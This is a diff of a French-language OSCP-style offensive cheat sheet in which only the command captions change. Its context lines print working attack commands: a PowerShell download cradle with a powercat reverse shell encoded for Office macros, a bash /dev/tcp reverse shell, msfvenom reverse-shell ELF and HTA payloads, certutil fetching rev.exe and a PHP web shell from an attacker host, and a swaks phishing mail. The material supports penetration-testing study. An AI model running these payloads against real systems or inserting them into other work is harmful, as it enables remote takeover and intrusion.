@@ -57,7 +57,7 @@ IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/powerca
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « MACROS ».</p>
+<p class="oscp-command-note">Macros Office : encoder une chaîne PowerShell au format Unicode Base64.</p>
 
 ```powershell
 $text = "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
@@ -67,7 +67,7 @@ Write-Output $encoded
 ```
 
 
-<p class="oscp-command-note">Script Python lié à « MACROS ».</p>
+<p class="oscp-command-note">Python : découper une chaîne PowerShell encodée en fragments pour l'exemple de macro.</p>
 
 ```python
 cmd_str = "[Your Base64 Encoded PowerShell Command]"
@@ -132,7 +132,7 @@ wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
 ```
 
 
-<p class="oscp-command-note">Exécuter un script PowerShell.</p>
+<p class="oscp-command-note">PowerShell : charger ou exécuter l'outil concerné par «Fichiers de bibliothèque Windows».</p>
 
 ```powershell
 # Créez le fichier comme un raccourci dans le système Windows pour préparer l'attaque
@@ -376,12 +376,12 @@ Moderate · Moderate · Moderate · Simple
 Examiner les permissions et la configuration de Linux.
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>
 
 ```bash
 echo 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' > shell.sh
 
-# Alternatively, use msfvenom to create an ELF payload
+# Autre méthode : générer un exécutable ELF avec msfvenom
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o shell.elf
 
 # Si la machine cible permet aux scripts Bash d'exécuter
@@ -430,7 +430,7 @@ End Sub
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Démarrer un serveur HTTP local pour fournir des fichiers.</p>
 
 ```bash
 python3 -m http.server 80
@@ -535,7 +535,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 `evil.hta`  
 
 
-<p class="oscp-command-note">Script Python lié à « Cibles Windows ».</p>
+<p class="oscp-command-note">Python : découper une chaîne encodée en blocs de 50 caractères pour l'exemple Windows.</p>
 
 ```python
 # script Python pour diviser la charge utile en morceaux de 50 caractères
@@ -674,7 +674,7 @@ swaks --to target@example.com --from emmanuel@example.com \
 `exploit.ods`  
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Créer un pseudo-terminal interactif avec Python.</p>
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -692,7 +692,7 @@ ipconfig /all
 ```
 
 
-<p class="oscp-command-note">Changer de répertoire.</p>
+<p class="oscp-command-note">Se placer dans le répertoire utilisé pour «Cibles Windows».</p>
 
 ```text
 cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe && certutil -urlcache -split -f http://[attacker_ip]/shell.pHp
